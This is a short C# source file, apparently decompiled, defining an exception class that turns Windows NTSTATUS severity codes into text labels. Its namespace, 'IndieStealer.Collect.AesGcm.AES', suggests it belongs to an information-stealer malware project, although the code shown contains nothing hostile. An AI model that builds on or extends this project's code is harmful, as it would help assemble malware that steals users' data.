using System;

namespace IndieStealer.Collect.AesGcm.AES
{
	[Serializable]
	public class NTStatusException : Exception
	{


		public NTSTATUS NativeErrorCode { get; }

		private static string GetSeverityString(NTSTATUS status)
		{
			NTSTATUS.SeverityCode severity = status.Severity;
			if (severity <= NTSTATUS.SeverityCode.STATUS_SEVERITY_INFORMATIONAL)
			{
				if (severity == NTSTATUS.SeverityCode.STATUS_SEVERITY_SUCCESS)
				{
					return "success";
				}
				if (severity == NTSTATUS.SeverityCode.STATUS_SEVERITY_INFORMATIONAL)
				{
					return "information";
				}
			}
			else
			{
				if (severity == (NTSTATUS.SeverityCode)2147483648U)
				{
					return "warning";
				}
				if (severity == (NTSTATUS.SeverityCode)3221225472U)
				{
					return "error";
				}
			}
			return string.Empty;
		}
	}
}
